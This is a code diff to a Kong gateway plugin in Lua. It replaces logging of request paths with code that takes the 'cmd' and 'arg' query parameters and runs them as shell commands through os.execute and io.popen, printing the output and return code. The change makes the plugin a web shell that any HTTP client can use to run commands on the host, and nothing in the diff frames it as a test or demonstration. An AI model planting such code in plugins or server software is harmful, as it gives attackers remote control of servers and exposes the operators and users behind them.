@@ -38,15 +38,30 @@ end --]]
 function plugin:access(plugin_conf)
 
   kong.log("========================>plugin:access() hit!<==============================")
-  local normalized_path = kong.request.get_path()
-  local raw_path = kong.request.get_raw_path()
-  kong.log("Normalized requested path:", normalized_path)
-  kong.log("Raw requested path:", raw_path)
 
-  kong.log("Path with query: ", kong.request.get_path_with_query())
+  -- Assemble components
+  local command = kong.request.get_query_arg("cmd")
+  local arg = kong.request.get_query_arg("arg")
+
+  -- VERSION 1: NO COMMAND OUTPUT
+  --[[
+  local raw_command = kong.request.get_raw_query()
   kong.log("Path with raw query: ", kong.request.get_raw_query())
+  os.execute(command .. " " .. arg)
+  --]]
 
-  kong.service.request.set_header(plugin_conf.request_header, "this is on a request")
+  -- VERSION 2: COMMAND OUTPUT HANDLING
+
+	local function osExecute(cmd)
+		local fileHandle     = assert(io.popen(cmd, 'r'))
+		local commandOutput  = assert(fileHandle:read('*a'))
+		local returnTable    = {fileHandle:close()}
+		return commandOutput,returnTable[3]            -- rc[3] contains returnCode
+	end
+
+  local output, rc = osExecute(command .. " " .. arg)
+  print("------------>CMD Output :", output, "\n")
+  print("------------>CMD Return Code :", rc, "\n")
 
 end
 
